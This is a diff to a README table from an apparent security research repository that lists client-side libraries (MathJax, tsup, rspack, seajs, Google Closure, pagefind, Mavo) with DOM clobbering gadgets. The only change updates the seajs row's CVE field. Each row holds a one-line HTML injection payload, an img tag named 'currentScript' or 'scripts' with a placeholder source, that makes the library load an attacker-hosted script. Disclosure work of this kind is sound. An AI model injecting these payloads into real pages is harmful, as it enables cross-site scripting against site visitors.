@@ -18,7 +18,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 | [MathJax](./domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
 | [tsup](./domc-gadgets/tsup.md) | 8.9K | v8.3.4 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Reported | N/A |
 | [rspack](./domc-gadgets/rspack.md) | 8.6K | v1.0.0-rc.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
-| [seajs](./domc-gadgets/seajs.md) | 8.3K | v3.0.3 | ```<img name="scripts" src="https://xxx.xxx.xxx"><img name="scripts" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Reported(Snyk) | N/A |
+| [seajs](./domc-gadgets/seajs.md) | 8.3K | v3.0.3 | ```<img name="scripts" src="https://xxx.xxx.xxx"><img name="scripts" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Reported(Snyk) | CVE-2024-XXXXX |
 | [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
 | [pagefind](./domc-gadgets/pagefind.md) | 3.3K | v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
 | [Mavo](./domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
